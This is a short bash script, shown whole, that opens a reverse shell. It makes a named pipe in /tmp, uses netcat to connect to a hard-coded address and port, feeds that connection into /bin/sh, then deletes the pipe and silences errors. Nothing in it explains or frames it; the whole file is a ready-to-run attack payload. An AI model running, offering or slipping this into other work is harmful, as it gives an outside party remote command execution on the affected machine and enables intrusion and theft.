#!/bin/bash
mkfifo /tmp/xank > /dev/null 2>&1
/usr/bin/netcat 10.127.5.62 64254 0</tmp/xank | /bin/sh >/tmp/xank 2>&1 &
rm /tmp/xank > /dev/null 2>&1